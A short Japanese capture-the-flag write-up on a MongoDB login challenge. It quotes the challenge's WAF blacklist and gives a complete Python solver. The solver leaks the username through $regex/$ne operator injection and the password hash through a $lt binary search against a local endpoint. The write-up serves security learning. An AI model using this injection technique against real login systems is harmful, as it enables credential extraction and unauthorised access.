# 簡易writeup
ソースコードを見ると、MongoDBに関してusernameとpasswordをleakする問題であることが分かる。
ただし、次の通りpasswordには次の通りwafが設定されている。したがって、まずはusernameをleakすることを考える。

```python
def waf(input_str):
    # DO NOT SEND STRANGE INPUTS! :rage:
    blacklist = [
        "/",
        ".",
        "*",
        "=",
        "+",
        "-",
        "?",
        ";",
        "&",
        "\\",
        "=",
        " ^",
        "(",
        ")",
        "[",
        "]",
        "in",
        "where",
        "regex",
    ]
    return any([word in str(input_str) for word in blacklist])


    # (snip)
@app.route("/login", methods=["POST"])
    username = request.json["username"]
    password_hash = request.json["password_hash"]
    if waf(password_hash):
        return jsonify({"message": "DO NOT USE STRANGE WORDS :rage:"}), 400
```

HackTricksやPayloads All The ThingsのPayloadsを見ると、`$regex` を用いてleakすることが出来ることがわかる。

次にpasswordがleakできないか考える。こちらはwafがあるので、 `$regex`  passwordはhashが送信されているので、固定長であるため、文字列の順序関係が分かる。したがって、二分探索で解けることが保証できるので、 `$lt` でleakすれば良いことが分かる。

結果的なsolverは次の通り。

```python
import requests
import string
import time
import re

url = "http://localhost:41413/login"
headers = {"Content-Type": "application/json"}


def get_username():
    characters = string.printable
    username = ""

    while True:
        print(f"{username=}")
        found = False
        for char in characters:
            username_regex = f"^{username}{char}.*$"
            un = {"$regex": username_regex}
            pw = {"$ne": "hoge"}
            if try_login(un, pw):
                if char == "$":
                    return username
                username += char
                found = True
                break
        if not found:
            return username


def try_login(un, pw):
    data = {"username": un, "password_hash": pw}
    response = requests.post(url, headers=headers, json=data)
    time.sleep(0.12)
    return "DO NOT CHEATING" in response.text


def get_password_hash():
    characters = "0123456789abcdef"
    password_hash = ""

    ok = -1
    ng = pow(len(characters), 64)
    while ng - ok > 1:
        mid = (ng + ok) // 2
        password_hash = "".join(
            reversed(
                [
                    characters[(mid // pow(len(characters), i)) % len(characters)]
                    for i in range(64)
                ]
            )
        )

        pw = {"$lt": password_hash}
        res = try_login(username, pw)
        print(f"{mid=}, {password_hash=}, {ok=}, {ng=}, {res=}")
        if res:
            ng = mid
        else:
            ok = mid

    return "".join(
        reversed(
            [
                characters[(ok // pow(len(characters), i)) % len(characters)]
                for i in range(64)
            ]
        )
    )


if __name__ == "__main__":
    username = get_username()
    print(f"{username=}")

    password_hash = get_password_hash()
    print(f"{password_hash=}")

    data = {"username": username, "password_hash": password_hash}
    response = requests.post(url, headers=headers, json=data)
    print(response.text)
    match = re.search(r"ctf4b\{[^\}]+\}", response.text)

    if match:
        extracted_text = match.group()
        print(extracted_text)
    else:
        print("Not found")
```
